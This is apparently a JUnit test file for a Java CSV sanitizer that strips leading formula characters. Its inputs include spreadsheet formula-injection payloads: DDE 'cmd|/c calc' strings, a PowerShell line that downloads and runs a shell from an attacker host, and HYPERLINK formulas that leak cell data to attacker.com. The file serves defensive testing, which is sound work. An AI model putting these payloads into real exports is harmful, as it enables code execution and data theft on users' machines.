package dev.depitropov.commons;

import static dev.depitropov.commons.DECsvSanitizer.sanitize;
import static org.assertj.core.api.SoftAssertions.assertSoftly;

import org.junit.jupiter.api.Test;

class DECsvSanitizerTest {

  @Test
  void testSanitize() {

    assertSoftly(
        soft -> {
          soft.assertThat(sanitize("\rdata")).isEqualTo("data");
          soft.assertThat(sanitize("\ndata")).isEqualTo("data");
          // ========== Smart +/- Handling - Preserve Numbers ==========
          soft.assertThat(sanitize("-100")).isEqualTo("-100");
          soft.assertThat(sanitize("-1")).isEqualTo("-1");
          soft.assertThat(sanitize("-999999")).isEqualTo("-999999");

          soft.assertThat(sanitize("+100")).isEqualTo("+100");
          soft.assertThat(sanitize("+1")).isEqualTo("+1");
          soft.assertThat(sanitize("+50")).isEqualTo("+50");

          soft.assertThat(sanitize("-cmd")).isEqualTo("cmd");
          soft.assertThat(sanitize("-attack")).isEqualTo("attack");
          soft.assertThat(sanitize("-2+3+cmd"))
              .isEqualTo("2+3+cmd"); // -2 looks like start of number but has non-digits

          soft.assertThat(sanitize("+cmd")).isEqualTo("cmd");
          soft.assertThat(sanitize("+DANGEROUS")).isEqualTo("DANGEROUS");
          soft.assertThat(sanitize("+attack123"))
              .isEqualTo("attack123"); // Has letters, not just digits

          soft.assertThat(sanitize("+")).isEmpty();
          soft.assertThat(sanitize("-")).isEmpty();

          soft.assertThat(sanitize("=cmd|'/c calc'!A1")).isEqualTo("cmd|'/c calc'!A1");

          soft.assertThat(sanitize("=cmd|'/c powershell IEX(wget attacker_server/shell.exe)'!A0"))
              .isEqualTo("cmd|'/c powershell IEX(wget attacker_server/shell.exe)'!A0");

          soft.assertThat(
                  sanitize("==@HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click here\")"))
              .isEqualTo("HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click here\")");

          soft.assertThat(sanitize("@SUM(1+1)*cmd|' /C calc'!A0"))
              .isEqualTo("SUM(1+1)*cmd|' /C calc'!A0");

          soft.assertThat(sanitize("=10-2+cmd|' /C calc'!A0")).isEqualTo("10-2+cmd|' /C calc'!A0");

          soft.assertThat(sanitize(null)).isNull();
          soft.assertThat(sanitize("")).isEmpty();

          soft.assertThat(sanitize("Normal text")).isEqualTo("Normal text");
          soft.assertThat(sanitize("123456")).isEqualTo("123456");
          soft.assertThat(sanitize("email@example.com")).isEqualTo("email@example.com");
          soft.assertThat(sanitize("Price: $100")).isEqualTo("Price: $100");
          soft.assertThat(sanitize("2024-10-09")).isEqualTo("2024-10-09");

          // @ symbol in middle of string (email) should not be modified
          soft.assertThat(sanitize("user@example.com")).isEqualTo("user@example.com");
          soft.assertThat(sanitize("\tdata")).isEqualTo("data");

          // Minus in middle of string should not be modified
          soft.assertThat(sanitize("a-b")).isEqualTo("a-b");

          // Plus in middle of string should not be modified
          soft.assertThat(sanitize("1 + 2 = 3")).isEqualTo("1 + 2 = 3");
          soft.assertThat(sanitize("a+b")).isEqualTo("a+b");

          // Equals in middle of string should not be modified
          soft.assertThat(sanitize("a=b")).isEqualTo("a=b");
          soft.assertThat(sanitize("x=10")).isEqualTo("x=10");

          soft.assertThat(sanitize("   ")).isEqualTo("");
          soft.assertThat(sanitize("  \t  ")).isEqualTo("");

          soft.assertThat(sanitize("==1+2")).isEqualTo("1+2");
          soft.assertThat(sanitize("@@SUM")).isEqualTo("SUM");

          soft.assertThat(sanitize("=+@-test")).isEqualTo("test");

          // Equals removed, 10000 a's remain
          final String longValue = "=".repeat(100) + "a".repeat(10000);

          soft.assertThat(sanitize(longValue)).hasSize(10000);
          soft.assertThat(sanitize(longValue)).startsWith("a");

          // Unicode characters should be preserved
          soft.assertThat(sanitize("Safe 中文 content")).isEqualTo("Safe 中文 content");

          // But dangerous start should still be removed
          soft.assertThat(sanitize("=中文")).isEqualTo("中文");

          // Test all dangerous characters individually
          soft.assertThat(sanitize("=")).isEmpty();
          soft.assertThat(sanitize("+")).isEmpty();
          soft.assertThat(sanitize("-")).isEmpty();
          soft.assertThat(sanitize("@")).isEmpty();
          soft.assertThat(sanitize("\t")).isEmpty();
          soft.assertThat(sanitize("\r")).isEmpty();
          soft.assertThat(sanitize("\n")).isEmpty();

          // Zero with +/- should become just "0"
          soft.assertThat(sanitize("-0")).isEqualTo("0");
          soft.assertThat(sanitize("-0000")).isEqualTo("0");
          soft.assertThat(sanitize("+0")).isEqualTo("0");
          soft.assertThat(sanitize("+0000")).isEqualTo("0");

          // Mixed alphanumeric, not just digits
          soft.assertThat(sanitize("-100abc")).isEqualTo("100abc");
          soft.assertThat(sanitize("+50xyz")).isEqualTo("50xyz");

          // Decimal numbers have dots, not just digits, so they're not preserved
          soft.assertThat(sanitize("-10.5")).isEqualTo("-10.5");
          soft.assertThat(sanitize("+10.5")).isEqualTo("+10.5");

          // Known attack patterns

          soft.assertThat(sanitize("@SUM(1+9)*cmd|' /C notepad.exe'!A0"))
              .isEqualTo("SUM(1+9)*cmd|' /C notepad.exe'!A0");

          soft.assertThat(sanitize("=1+1")).isEqualTo("1+1");

          soft.assertThat(sanitize("=1+2';=1+2'\"'''\"")).isEqualTo("1+2';=1+2\"");
          soft.assertThat(sanitize("=1+2\";=1+2\"\"'\"'")).isEqualTo("1+2\";=1+2\"");

          soft.assertThat(sanitize("=1+2'\" ;,=1+2")).isEqualTo("1+2\" ;,=1+2");

          soft.assertThat(sanitize("+1234567890")).isEqualTo("+1234567890"); // Number, preserved

          soft.assertThat(sanitize("=10+20+cmd|' /C calc'!A0"))
              .isEqualTo("10+20+cmd|' /C calc'!A0");

          soft.assertThat(sanitize("=HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click\")"))
              .isEqualTo("HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click\")");
        });
  }
}
